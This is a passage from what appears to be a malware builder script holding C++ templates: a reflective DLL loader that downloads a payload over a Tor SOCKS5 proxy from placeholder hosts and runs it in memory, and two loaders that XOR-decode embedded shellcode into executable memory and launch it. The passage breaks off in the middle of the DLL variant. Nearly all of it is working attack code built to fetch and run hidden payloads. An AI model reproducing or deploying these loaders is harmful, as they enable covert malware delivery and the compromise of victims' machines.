                        iatThunk->u1.Function = 0;
                    }

                    ++origThunk;
                    ++iatThunk;
                }

                ++impDesc;
            }
        }
    }

    // Set memory protections for sections (validated)
    for (WORD i = 0; i < numSections; ++i) {
        BYTE* dest = (BYTE*)mem + sections[i].VirtualAddress;
        DWORD size = sections[i].Misc.VirtualSize;
        if (!in_image(dest, size)) continue; // skip invalid region

        DWORD oldProtect = 0;
        DWORD protect = 0;
        BOOL isExecutable = (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL isReadable = (sections[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
        BOOL isWritable = (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        if (isExecutable) {
            if (isReadable) {
                if (isWritable) {
                    protect = PAGE_EXECUTE_READWRITE;
                }
                else {
                    protect = PAGE_EXECUTE_READ;
                }
            }
            else {
                if (isWritable) {
                    protect = PAGE_EXECUTE_WRITECOPY;
                }
                else {
                }
            }
        }
        else {
            protect = PAGE_EXECUTE;

            if (isReadable) {
                if (isWritable) {
                    protect = PAGE_READWRITE;
                }
                else {
                    protect = PAGE_READONLY;
                }
            }
            else {
                if (isWritable) {
                    protect = PAGE_WRITECOPY;
                }
                else {
                    protect = PAGE_NOACCESS;
                }
            }
        }
        VirtualProtect(dest, size, protect, &oldProtect);
    }
    // Call the entry point (validate entry point RVA against the copied image)
    if (entryPointRVA != 0)
    {
        BYTE* entryPtr = (BYTE*)mem + entryPointRVA;

        // sanity check — make sure entrypoint is inside manually mapped image
        if (in_image(entryPtr, 1))
        {
            // The entrypoint of a DLL follows the DllMain prototype:
            // BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
            using DllMainFunc = BOOL (WINAPI*)(HINSTANCE, DWORD, LPVOID);

            DllMainFunc dllMain = (DllMainFunc)entryPtr;

            dllMain((HINSTANCE)mem, DLL_PROCESS_ATTACH, nullptr);
        }
    }


    if (main_func) {
        FlushInstructionCache(GetCurrentProcess(), mem, imageSize);

        threadhandle = CreateThread(
            nullptr,
            0,
            (LPTHREAD_START_ROUTINE)main_func,
            nullptr,
            0,
            nullptr
        );

        if (threadhandle) {
            WaitForSingleObject(threadhandle, INFINITE); // wait for completion
            CloseHandle(threadhandle);
        }
    }

    return TRUE;
}



BOOL APIENTRY DllMain(HMODULE hModuleCall,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}"""

manualMapper = """#include <winsock2.h>     // MUST be first before windows.h
#include <ws2tcpip.h>     // optional, for inet_pton, getaddrinfo, etc.
#include <windows.h>      // main Windows API
#include <string>
#include <vector>
#include <algorithm>      // for std::search
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

static unsigned char* dllcode = nullptr;
static size_t dllsize = 0;


bool download_through_socks5(const char* proxy_ip, int proxy_port,
    const char* host, int port,
    const char* path)
{
    WSADATA w{};
    if (WSAStartup(MAKEWORD(2, 2), &w) != 0) return false;

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { WSACleanup(); return false; }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)proxy_port);
    if (inet_pton(AF_INET, proxy_ip, &addr.sin_addr) != 1) {
        closesocket(s); WSACleanup(); return false;
    }

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s); WSACleanup(); return false;
    }

    // SOCKS5 greeting (no auth)
    unsigned char greet[3] = { 0x05, 0x01, 0x00 };
    if (send(s, (const char*)greet, 3, 0) != 3) { closesocket(s); WSACleanup(); return false; }

    unsigned char resp[2] = { 0 };
    if (recv(s, (char*)resp, 2, 0) != 2) { closesocket(s); WSACleanup(); return false; }
    if (resp[1] != 0x00) { closesocket(s); WSACleanup(); return false; }

    // Build CONNECT request (domain)
    std::string hostStr(host);
    std::vector<unsigned char> req;
    req.push_back(0x05); // ver
    req.push_back(0x01); // CONNECT
    req.push_back(0x00); // rsv
    req.push_back(0x03); // domain
    req.push_back((unsigned char)hostStr.size());
    req.insert(req.end(), hostStr.begin(), hostStr.end());
    req.push_back((unsigned char)((port >> 8) & 0xFF));
    req.push_back((unsigned char)(port & 0xFF));

    if (send(s, (const char*)req.data(), (int)req.size(), 0) != (int)req.size()) { closesocket(s); WSACleanup(); return false; }

    unsigned char reply[10];
    if (recv(s, (char*)reply, (int)sizeof(reply), 0) <= 1) { closesocket(s); WSACleanup(); return false; }
    if (reply[1] != 0x00) { closesocket(s); WSACleanup(); return false; }

    // HTTP GET through tunnel
    std::string http = std::string("GET ") + path + " HTTP/1.1\\r\\nHost: " + hostStr + "\\r\\nConnection: close\\r\\n\\r\\n";
    if (send(s, http.c_str(), (int)http.size(), 0) != (int)http.size()) { closesocket(s); WSACleanup(); return false; }

    // Read all
    std::vector<unsigned char> data;
    unsigned char buf[4096];
    int r;
    while ((r = recv(s, (char*)buf, sizeof(buf), 0)) > 0) {
        data.insert(data.end(), buf, buf + r);
    }

    closesocket(s);
    WSACleanup();

    // Find header/body separator
    const std::string hdr = "\\r\\n\\r\\n";
    auto it = std::search(data.begin(), data.end(), hdr.begin(), hdr.end());
    if (it == data.end()) return false;

    size_t headerSize = (it - data.begin()) + hdr.size();
    size_t bodySize = data.size() - headerSize;

    // allocate static buffer
    dllsize = bodySize;
    dllcode = new unsigned char[dllsize];
    memcpy(dllcode, data.data() + headerSize, dllsize);

    return true;
}

HANDLE threadhandle;

extern "C" __declspec(dllexport) int WINAPI stop() {
    TerminateThread(threadhandle, 0);
    return 0;
}

extern "C" __declspec(dllexport) int WINAPI resume() {
    ResumeThread(threadhandle);
    return 0;
}

extern "C" __declspec(dllexport) int WINAPI suspend() {
    SuspendThread(threadhandle);
    return 0;
}

extern "C" __declspec(dllexport) int WINAPI main_func() {
    if (download_through_socks5("127.0.0.1", 9050, "INJECTURL1", 80, "INJECTURL2"))
    {
        
    }
    else
    {
        
    }

    // Point hModule at the raw dll bytes so the loader will treat the blob as the "original image".
    HMODULE hModule = (HMODULE)dllcode;
    const SIZE_T dllBlobSize = dllsize;

    if (hModule == NULL) {
        return FALSE;
    }

    // Parse DOS/NT headers from the on-disk image (raw blob) to obtain sizes for allocation.
    PIMAGE_DOS_HEADER pDosHeaderOrig = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeaderOrig->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    PIMAGE_NT_HEADERS64 pNtHeadersOrig = (PIMAGE_NT_HEADERS64)((BYTE*)hModule + pDosHeaderOrig->e_lfanew);
    if (pNtHeadersOrig->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    BOOL is64BitOrig = (pNtHeadersOrig->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC);
    if (!is64BitOrig) {
        return FALSE;
    }

    // Use orig headers only to allocate memory.
    SIZE_T imageSizeAlloc = (SIZE_T)pNtHeadersOrig->OptionalHeader.SizeOfImage;
    LPVOID preferredBaseAlloc = (LPVOID)(ULONG_PTR)pNtHeadersOrig->OptionalHeader.ImageBase;

    // Allocate memory for the image (same as before)
    LPVOID mem = VirtualAlloc(preferredBaseAlloc, imageSizeAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    BOOL usedPreferredBase = TRUE;
    if (mem == NULL) {
        mem = VirtualAlloc(NULL, imageSizeAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        usedPreferredBase = FALSE;
    }
    if (mem == NULL) {
        return FALSE; // allocation failed
    }

    // Copy headers (from original image in memory)
    SIZE_T headersSize = pNtHeadersOrig->OptionalHeader.SizeOfHeaders;
    memcpy(mem, hModule, headersSize);

    // Re-parse headers from the copied image (mem) and use these for all further validation/operations.
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)mem;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
    PIMAGE_NT_HEADERS64 pNtHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)mem + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
    if (pNtHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }

    SIZE_T imageSize = (SIZE_T)pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD entryPointRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    IMAGE_DATA_DIRECTORY* dataDir = pNtHeaders->OptionalHeader.DataDirectory;

    // Helper to validate that a pointer/region resides entirely inside the copied image.
    auto in_image = [&](BYTE* p, SIZE_T sz = 1)->bool {
        if (!mem) return false;
        BYTE* base = (BYTE*)mem;
        BYTE* end = base + imageSize;
        if (p < base) return false;
        if (sz == 0) return (p <= end);
        // check overflow
        if (p + (sz - 1) < p) return false;
        return (p + sz) <= end;
        };

    // Section table from the copied image
    WORD numSections = pNtHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(pNtHeaders);

    // original image bounds (as observed in the process where the loader runs)
    BYTE* origBase = (BYTE*)hModule;               // points into the raw blob (file layout)
    SIZE_T origImageSize = (SIZE_T)pNtHeadersOrig->OptionalHeader.SizeOfImage; // virtual size requested
    BYTE* origEnd = origBase + origImageSize;     // not safe for file-layout blobs
    // raw blob end is the actual buffer length
    BYTE* origBlobEnd = origBase + dllBlobSize;

    // Decide if the downloaded blob is a file-image (raw on-disk) or an in-memory mapped image
    // If the raw blob is smaller than the reported SizeOfImage it's almost certainly a file-layout blob.
    bool blobLooksLikeFileLayout = (dllBlobSize < origImageSize);
    if (blobLooksLikeFileLayout) {

    }
    else {

    }

    // Copy sections: when we have a file-layout blob, use PointerToRawData as source; otherwise prefer VA-located data.
    for (WORD i = 0; i < numSections; ++i) {
        DWORD virtRVA = sections[i].VirtualAddress;
        DWORD rawSize = sections[i].SizeOfRawData;
        DWORD virtSize = sections[i].Misc.VirtualSize;
        DWORD pointerToRaw = sections[i].PointerToRawData;
        BYTE* dest = (BYTE*)mem + virtRVA;

        // Validate dest region fits in allocated image
        if (!in_image(dest, virtSize)) {
            char dbg[128];
            _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "Section %u destination out-of-bounds: dest=%p virtSize=0x%X", i, dest, virtSize);
            continue;
        }

        SIZE_T copySize = (virtSize < rawSize) ? (SIZE_T)virtSize : (SIZE_T)rawSize;

        BYTE* srcFromVA = origBase + virtRVA;            // candidate if blob is mapped image
        BYTE* srcFromRaw = origBase + pointerToRaw;      // candidate if blob is file/image on disk

        bool copied = false;

        if (blobLooksLikeFileLayout) {
            // prefer raw PointerToRawData source when the blob is file-layout
            if (pointerToRaw != 0 && pointerToRaw + copySize <= dllBlobSize) {
                memcpy(dest, srcFromRaw, copySize);
                copied = true;
            }
            else {
                // fallback: if VA-based source is inside blob (rare) use it
                if ((srcFromVA >= origBase) && ((srcFromVA + copySize) <= origBlobEnd)) {
                    memcpy(dest, srcFromVA, copySize);
                    copied = true;
                }
            }
        }
        else {
            // blob likely mapped image: prefer VA data
            if ((srcFromVA >= origBase) && ((srcFromVA + copySize) <= origBlobEnd)) {
                memcpy(dest, srcFromVA, copySize);
                copied = true;
            }
            else if (pointerToRaw != 0 && (pointerToRaw + copySize) <= dllBlobSize) {
                memcpy(dest, srcFromRaw, copySize);
                copied = true;
            }
        }

        if (!copied && copySize > 0) {
            // no valid source inside blob -> zero out raw area (safe fallback)
            memset(dest, 0, copySize);
        }

        // Zero any remaining virtual bytes
        if (virtSize > copySize) {
            memset(dest + copySize, 0, virtSize - copySize);
        }

        // Debug info for each section copy
        char dbg[256];
        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE,
            "Section %u: VA=0x%08X Raw=0x%X Virt=0x%X PtrToRaw=0x%08X copied=%d copySize=0x%Ix",
            i, virtRVA, rawSize, virtSize, pointerToRaw, (int)copied, copySize);
    }

    // Continue with relocations/imports/exports as before (not fully changed here)
    INT64 offsetDelta = (INT64)((BYTE*)mem - (BYTE*)preferredBaseAlloc);

    // Relocations
    if (!usedPreferredBase) {
        if (dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0 &&
            dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size != 0)
        {
            BYTE* relocBase = (BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
            DWORD relocSize = dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
            if (in_image(relocBase, relocSize)) {
                BYTE* relocEnd = relocBase + relocSize;
                while (relocBase < relocEnd) {
                    if (!in_image(relocBase, sizeof(IMAGE_BASE_RELOCATION))) break;
                    IMAGE_BASE_RELOCATION* block = (IMAGE_BASE_RELOCATION*)relocBase;
                    DWORD pageRVA = block->VirtualAddress;
                    DWORD blockSize = block->SizeOfBlock;
                    if (blockSize < sizeof(IMAGE_BASE_RELOCATION)) break;
                    BYTE* entriesBase = relocBase + sizeof(IMAGE_BASE_RELOCATION);
                    DWORD entriesBytes = blockSize - sizeof(IMAGE_BASE_RELOCATION);
                    if (!in_image(entriesBase, entriesBytes)) break;
                    WORD* entries = (WORD*)(entriesBase);
                    size_t entryCount = entriesBytes / sizeof(WORD);
                    for (size_t i = 0; i < entryCount; ++i) {
                        WORD entry = entries[i];
                        WORD type = entry >> 12;
                        WORD offset = entry & 0x0FFF;
                        BYTE* target = (BYTE*)mem + pageRVA + offset;
                        if (!in_image(target, (type == IMAGE_REL_BASED_DIR64) ? sizeof(INT64) : sizeof(DWORD))) {
                            continue; // skip out-of-bounds reloc
                        }
                        if (type == IMAGE_REL_BASED_HIGHLOW) {
                            continue;
                        }
                        else if (type == IMAGE_REL_BASED_DIR64) {
                            INT64* p = (INT64*)target;
                            *p += offsetDelta;
                        }
                    }
                    relocBase += blockSize;
                }
            }
        }
    }

    using MainFuncType = DWORD(WINAPI*)(LPVOID lpParameter);
    MainFuncType main_func = nullptr;

    // Export table handling (same as prior code - keep bounds checking)
    if (dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0 &&
        dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size != 0)
    {
        IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        if (in_image((BYTE*)exp, sizeof(IMAGE_EXPORT_DIRECTORY))) {
            DWORD numberOfNames = exp->NumberOfNames;
            DWORD numberOfFunctions = exp->NumberOfFunctions;
            DWORD exportDirSize = dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

            char dbg2[256];
            _snprintf_s(dbg2, sizeof(dbg2), _TRUNCATE,
                "ExportDir AddrOfFunctions=0x%X DirSize=0x%X #Names=%u #Funcs=%u",
                exp->AddressOfFunctions, exportDirSize, exp->NumberOfNames, exp->NumberOfFunctions);

            DWORD* funcRVAs = nullptr;
            DWORD* nameRVAs = nullptr;
            WORD* ords = nullptr;

            if (exp->AddressOfFunctions != 0) funcRVAs = (DWORD*)((BYTE*)mem + exp->AddressOfFunctions);
            if (exp->AddressOfNames != 0) nameRVAs = (DWORD*)((BYTE*)mem + exp->AddressOfNames);
            if (exp->AddressOfNameOrdinals != 0) ords = (WORD*)((BYTE*)mem + exp->AddressOfNameOrdinals);

            bool arrays_ok = true;
            if (funcRVAs == nullptr || nameRVAs == nullptr || ords == nullptr) arrays_ok = false;
            else {
                if (!in_image((BYTE*)funcRVAs, sizeof(DWORD) * (size_t)numberOfFunctions)) arrays_ok = false;
                if (!in_image((BYTE*)nameRVAs, sizeof(DWORD) * (size_t)numberOfNames)) arrays_ok = false;
                if (!in_image((BYTE*)ords, sizeof(WORD) * (size_t)numberOfNames)) arrays_ok = false;
            }

            if (arrays_ok) {
                char dbg[256];
                for (DWORD i = 0; i < numberOfNames; ++i) {
                    DWORD nameRVA = nameRVAs[i];
                    if (!in_image((BYTE*)mem + nameRVA, 1)) continue;
                    BYTE* namePtr = (BYTE*)mem + nameRVA;
                    size_t maxLen = (BYTE*)mem + imageSize - namePtr;
                    std::string nameStr((const char*)namePtr, strnlen_s((const char*)namePtr, maxLen));
                    _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "Export #%u name: '%s'", i, nameStr.c_str());

                    if (nameStr == "MAINFUNC_NAME") {
                        WORD funcIndex = ords[i];
                        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "funcIndex=%u (must be < %u)", funcIndex, numberOfFunctions);
                        if (funcIndex >= numberOfFunctions) {
                            continue;
                        }
                        DWORD funcRVA = funcRVAs[funcIndex];
                        BYTE* funcVA = (BYTE*)mem + funcRVA;
                        _snprintf_s(dbg, sizeof(dbg), _TRUNCATE, "funcRVA=0x%08X funcVA=%p in_image=%d", funcRVA, funcVA, in_image(funcVA, 1));
                        if (!in_image(funcVA, 1)) { continue; }

                        main_func = (MainFuncType)(funcVA);
                    }
                }
            }
            else {
            }
        }
    }

    // (imports, protections, entry point call etc. unchanged from earlier sample)

    // Resolve imports safely: validate import directory and all computed pointers
    if (dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0 &&
        dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].Size != 0)
    {
        BYTE* importBase = (BYTE*)mem + dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        DWORD importSize = dataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
        if (in_image(importBase, 1) && in_image(importBase, importSize)) {
            IMAGE_IMPORT_DESCRIPTOR* impDesc = (IMAGE_IMPORT_DESCRIPTOR*)importBase;
            // iterate descriptors until a null descriptor or out-of-bounds
            while (in_image((BYTE*)impDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && impDesc->Name != 0) {
                // validate dll name pointer
                BYTE* dllNamePtr = (BYTE*)mem + impDesc->Name;
                if (!in_image(dllNamePtr, 1)) {
                    ++impDesc;
                    continue;
                }
                const char* dllName = (const char*)dllNamePtr;
                HMODULE hMod = LoadLibraryA(dllName);
                if (!hMod) {
                    // skip unresolved library but continue processing remaining descriptors
                    ++impDesc;
                    continue;
                }

                // Use OriginalFirstThunk if present, otherwise fall back to FirstThunk
                DWORD origRVA = impDesc->OriginalFirstThunk;
                DWORD iatRVA = impDesc->FirstThunk;
                if (iatRVA == 0) { ++impDesc; continue; } // nothing to do

                IMAGE_THUNK_DATA64* origThunk = (IMAGE_THUNK_DATA64*)((BYTE*)mem + (origRVA ? origRVA : iatRVA));
                IMAGE_THUNK_DATA64* iatThunk = (IMAGE_THUNK_DATA64*)((BYTE*)mem + iatRVA);

                // Validate thunk pointers lie inside the image
                if (!in_image((BYTE*)origThunk, sizeof(IMAGE_THUNK_DATA64)) ||
                    !in_image((BYTE*)iatThunk, sizeof(IMAGE_THUNK_DATA64)))
                {
                    ++impDesc;
                    continue;
                }

                // Iterate thunk entries with bounds checks
                while (in_image((BYTE*)origThunk, sizeof(IMAGE_THUNK_DATA64)) &&
                    in_image((BYTE*)iatThunk, sizeof(IMAGE_THUNK_DATA64)) &&
                    origThunk->u1.AddressOfData != 0)
                {
                    FARPROC func = nullptr;
                    if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                        WORD ord = (WORD)(origThunk->u1.Ordinal & 0xFFFF);
                        func = GetProcAddress(hMod, (LPCSTR)(uintptr_t)ord);
                    }
                    else {
                        // IMAGE_IMPORT_BY_NAME structure
                        IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)((BYTE*)mem + origThunk->u1.AddressOfData);
                        if (!in_image((BYTE*)ibn, sizeof(WORD) + 1) || !in_image((BYTE*)ibn->Name, 1)) {
                            // invalid or truncated import by name; stop this thunk chain
                            break;
                        }
                        // Ensure the name is null-terminated before passing to GetProcAddress.
                        // We can't easily know the full length safely, so check that the start is inside the image.
                        func = GetProcAddress(hMod, (LPCSTR)ibn->Name);
                    }

                    // Only patch if func resolved
                    if (func) {
                        iatThunk->u1.Function = (ULONGLONG)func;
                    }
                    else {
                        // handle unresolved export (set to NULL)
                        iatThunk->u1.Function = 0;
                    }

                    ++origThunk;
                    ++iatThunk;
                }

                ++impDesc;
            }
        }
    }

    // Set memory protections for sections (validated)
    for (WORD i = 0; i < numSections; ++i) {
        BYTE* dest = (BYTE*)mem + sections[i].VirtualAddress;
        DWORD size = sections[i].Misc.VirtualSize;
        if (!in_image(dest, size)) continue; // skip invalid region

        DWORD oldProtect = 0;
        DWORD protect = 0;
        BOOL isExecutable = (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL isReadable = (sections[i].Characteristics & IMAGE_SCN_MEM_READ) != 0;
        BOOL isWritable = (sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        if (isExecutable) {
            if (isReadable) {
                if (isWritable) {
                    protect = PAGE_EXECUTE_READWRITE;
                }
                else {
                    protect = PAGE_EXECUTE_READ;
                }
            }
            else {
                if (isWritable) {
                    protect = PAGE_EXECUTE_WRITECOPY;
                }
                else {
                }
            }
        }
        else {
            protect = PAGE_EXECUTE;

            if (isReadable) {
                if (isWritable) {
                    protect = PAGE_READWRITE;
                }
                else {
                    protect = PAGE_READONLY;
                }
            }
            else {
                if (isWritable) {
                    protect = PAGE_WRITECOPY;
                }
                else {
                    protect = PAGE_NOACCESS;
                }
            }
        }
        VirtualProtect(dest, size, protect, &oldProtect);
    }
    // Call the entry point (validate entry point RVA against the copied image)
    if (entryPointRVA != 0)
    {
        BYTE* entryPtr = (BYTE*)mem + entryPointRVA;

        // sanity check — make sure entrypoint is inside manually mapped image
        if (in_image(entryPtr, 1))
        {
            // The entrypoint of a DLL follows the DllMain prototype:
            // BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
            using DllMainFunc = BOOL (WINAPI*)(HINSTANCE, DWORD, LPVOID);

            DllMainFunc dllMain = (DllMainFunc)entryPtr;

            dllMain((HINSTANCE)mem, DLL_PROCESS_ATTACH, nullptr);
        }
    }


    if (main_func) {
        FlushInstructionCache(GetCurrentProcess(), mem, imageSize);

        threadhandle = CreateThread(
            nullptr,
            0,
            (LPTHREAD_START_ROUTINE)main_func,
            nullptr,
            0,
            nullptr
        );

        if (threadhandle) {
            WaitForSingleObject(threadhandle, INFINITE); // wait for completion
            CloseHandle(threadhandle);
        }
    }

    return TRUE;


}

BOOL APIENTRY DllMain(HMODULE hModuleCall,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}"""

shellCodeLoader = """
// Build (x64 developer cmd): 
// cl /EHsc /O2 /std:c++17 script.cpp /link user32.lib shell32.lib myicon.res
#include <windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <tlhelp32.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <iostream>

static LPVOID g_alloc = nullptr;
static SIZE_T g_allocSize = 0;

LONG WINAPI VehLog(PEXCEPTION_POINTERS ep) {
    if (!ep || !ep->ExceptionRecord) return EXCEPTION_CONTINUE_SEARCH;
    auto& er = *ep->ExceptionRecord;
    if (er.ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        ULONG_PTR rw = er.ExceptionInformation[0];
        ULONG_PTR addr = er.ExceptionInformation[1];
        std::cerr << "VEH: ACCESS_VIOLATION " << (rw ? "WRITE" : "READ")
            << " faultAddr=0x" << std::hex << addr << std::dec << "\\n";
        if (g_alloc) {
            uintptr_t base = (uintptr_t)g_alloc;
            std::cerr << "  allocBase=0x" << std::hex << base << " size=0x" << g_allocSize << std::dec << "\\n";
            if (addr >= base && addr < base + g_allocSize)
                std::cerr << "  -> Fault INSIDE allocated region.\\n";
            else
                std::cerr << "  -> Fault OUTSIDE allocated region.\\n";
        }
        std::cerr << "  ExceptionAddress = 0x" << std::hex
            << (uintptr_t)er.ExceptionAddress << std::dec << "\\n";
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int WINAPI WinMain(
    HINSTANCE hInstance,      // Handle to the current instance of the application.
    HINSTANCE hPrevInstance,  // Handle to the previous instance (always NULL in modern Windows).
    LPSTR lpCmdLine,          // Command line arguments as a null-terminated ANSI string (excluding program name).
    int nCmdShow              // Flag specifying how the window is to be shown (e.g., minimized, maximized).
) {
    PVOID vh = AddVectoredExceptionHandler(1, VehLog);

    // Example payload (choose x64/x86 match your build). Replace with any test bytes.
    SHELLCODE_PLACEHOLDER
        
    SIZE_T len = sizeof(enc);

    // Allocate RWX (or allocate RW and call VirtualProtect to RX after memcpy)
    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) { std::cerr << "VirtualAlloc failed: " << GetLastError() << "\\n"; return 1; }
    g_alloc = exec; g_allocSize = len;

    std::cout << "Allocated exec at: " << exec << " len=0x" << std::hex << len << std::dec << "\\n";

    char key[] = "KEY_PLACEHOLDER";
    size_t key_len = sizeof(key) - 1;
    
    for (size_t i = 0; i < len; i++)
        ((unsigned char*)exec)[i] = enc[i] ^ key[i % key_len];

    // Flush cache
    FlushInstructionCache(GetCurrentProcess(), exec, len);

    // Print memory info
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(exec, &mbi, sizeof(mbi))) {
        std::cerr << "MBI: Base=0x" << std::hex << (uintptr_t)mbi.BaseAddress
            << " RegionSize=0x" << mbi.RegionSize
            << " Protect=0x" << mbi.Protect << std::dec << "\\n";
    }

    // Execute
    bool useThread = true;
    std::cout << "Calling payload at " << exec << " useThread=" << useThread << "\\n";

    DWORD tid;
    if (useThread) {
        HANDLE th = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec, nullptr, 0, &tid);
        if (!th) {
            std::cerr << "CreateThread failed: " << GetLastError() << "\\n";
        } else {
            WaitForSingleObject(th, INFINITE);
            CloseHandle(th);
        }
    } else {
        typedef void(*fn)();
        fn f = (fn)exec;
        __try { f(); }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            std::cerr << "SEH: exception code 0x" << std::hex << GetExceptionCode() << std::dec << "\\n";
        }
    }

    // Cleanup
    VirtualFree(exec, 0, MEM_RELEASE);
    std::cerr << "Memory freed\\n";

    RemoveVectoredExceptionHandler(vh);
    return 0;
}
"""

# This variant of shellCodeLoader for DLL output switches WinMain for DLL export function
# ... previous code remains identical ...

shellCodeLoaderDLL = """
#include <windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <tlhelp32.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <iostream>

static LPVOID g_alloc = nullptr;
static SIZE_T g_allocSize = 0;

LONG WINAPI VehLog(PEXCEPTION_POINTERS ep) {
    if (!ep || !ep->ExceptionRecord) return EXCEPTION_CONTINUE_SEARCH;
    auto& er = *ep->ExceptionRecord;
    if (er.ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        ULONG_PTR rw = er.ExceptionInformation[0];
        ULONG_PTR addr = er.ExceptionInformation[1];
        std::cerr << "VEH: ACCESS_VIOLATION " << (rw ? "WRITE" : "READ")
            << " faultAddr=0x" << std::hex << addr << std::dec << "\\n";
        if (g_alloc) {
            uintptr_t base = (uintptr_t)g_alloc;
            std::cerr << "  allocBase=0x" << std::hex << base << " size=0x" << g_allocSize << std::dec << "\\n";
            if (addr >= base && addr < base + g_allocSize)
                std::cerr << "  -> Fault INSIDE allocated region.\\n";
            else
                std::cerr << "  -> Fault OUTSIDE allocated region.\\n";
        }
        std::cerr << "  ExceptionAddress = 0x" << std::hex
            << (uintptr_t)er.ExceptionAddress << std::dec << "\\n";
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// Exported main_func to be called when DLL is loaded or externally
extern "C" __declspec(dllexport) int main_func()
{
    PVOID vh = AddVectoredExceptionHandler(1, VehLog);

    // Example payload (choose x64/x86 match your build). Replace with any test bytes.
    SHELLCODE_PLACEHOLDER
        
    SIZE_T len = sizeof(enc);

    // Allocate RWX (or allocate RW and call VirtualProtect to RX after memcpy)
    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) { std::cerr << "VirtualAlloc failed: " << GetLastError() << "\\n"; return 1; }
    g_alloc = exec; g_allocSize = len;

    std::cout << "Allocated exec at: " << exec << " len=0x" << std::hex << len << std::dec << "\\n";

    char key[] = "KEY_PLACEHOLDER";
    size_t key_len = sizeof(key) - 1;
    
    for (size_t i = 0; i < len; i++)
        ((unsigned char*)exec)[i] = enc[i] ^ key[i % key_len];

    // Flush cache
    FlushInstructionCache(GetCurrentProcess(), exec, len);

    // Print memory info
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(exec, &mbi, sizeof(mbi))) {
        std::cerr << "MBI: Base=0x" << std::hex << (uintptr_t)mbi.BaseAddress
            << " RegionSize=0x" << mbi.RegionSize
